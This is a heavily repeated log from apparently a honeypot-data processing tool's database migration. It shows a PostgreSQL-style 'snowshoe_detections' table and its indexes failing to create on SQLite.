2025-10-18 18:32:40,809:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:40,809:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:40,809:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:40,809:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:40,809:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:40,809:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:40,809:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:40,809:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:40,811:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:40,811:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:40,811:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:40,811:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:40,811:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:40,811:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:40,811:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:40,811:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:40,811:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:40,811:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:40,815:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:40,815:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:40,815:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:40,815:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:40,815:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:40,815:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:40,815:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:40,815:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:40,815:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:40,815:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:40,817:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:40,817:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:40,817:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:40,817:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:40,817:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:40,817:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:40,817:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:40,817:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:40,817:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:40,817:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:40,820:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:40,820:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
SQLite boolean defaults for files.vt_malicious will be set on next schema creation
SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:40,820:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:40,820:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:40,820:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:40,820:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:40,820:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:40,820:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:40,820:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:40,820:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:40,823:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:40,823:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:40,823:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:40,823:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:40,823:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:40,823:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:40,823:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:40,823:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:40,823:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:40,823:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:40,824:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:40,824:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
Starting snowshoe detection schema migration (v8)
Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:40,824:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:40,824:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:40,824:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:40,824:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:40,824:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:40,824:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:40,824:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:40,824:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:40,826:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:40,826:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:40,826:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:40,826:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:40,826:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:40,826:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:40,826:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:40,826:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:40,826:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:40,826:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:40,830:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,830:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,830:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,830:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,830:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,830:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,830:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,830:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,830:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,830:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,832:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,832:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,832:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,832:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,832:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,832:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,832:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,832:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,832:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,832:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,836:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,836:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
